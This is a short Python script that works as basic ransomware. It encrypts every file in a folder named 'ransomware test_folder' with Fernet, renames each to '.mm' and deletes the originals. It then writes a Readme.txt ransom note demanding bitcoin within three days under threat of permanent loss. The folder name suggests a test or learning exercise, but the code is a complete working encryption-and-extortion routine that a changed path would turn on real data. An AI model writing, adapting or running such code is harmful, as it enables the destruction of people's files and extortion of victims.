import subprocess
import os
from cryptography.fernet import Fernet

directory_name = "ransomware test_folder"
dir_files = os.listdir("ransomware test_folder")

encryption_key = Fernet.generate_key()
with open("key.key", "wb") as key_file:
    key_file.write(encryption_key)
extensions_md = []
key = Fernet(encryption_key)
for file in dir_files:
    file_name = os.path.splitext(file)[0]
    file_ext = os.path.splitext(file)[1]
    extensions_md.append((file_name, file_ext))
    path = os.path.join(directory_name, file)
    new_file_ext_name = file_name + ".mm"
    new_path = os.path.join(directory_name, new_file_ext_name)
    with open(path, "rb") as normal_file:
        data = normal_file.read()
        encrypted_data = key.encrypt(data)
    with open(new_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)
    os.remove(path)
for extension in extensions_md:
    with open("metadata.txt", "a") as meta_file:
        meta_file.write(str(extension[0]) + "," + str(extension[1]) + "\n")
with open("metadata.txt", "rb") as meta_file:
    meta_norm = meta_file.read()
    encr_meta = key.encrypt(meta_norm)

with open("metadata.mm", "wb") as encrypted_file:
    encrypted_file.write(encr_meta)
    os.remove("metadata.txt")

with open("Readme.txt", "w") as readme:
    readme.write("Your computer has been hacked!\n")
    readme.write("All your files have been encrypted\n")
    readme.write("As for to recover your files, pay the required money as this bitcoin wallet 028afe9201x\n")
    readme.write("If the payment is not made within 3 days, all the files will be deleted and will forever be lost\n")
    readme.write("MM")
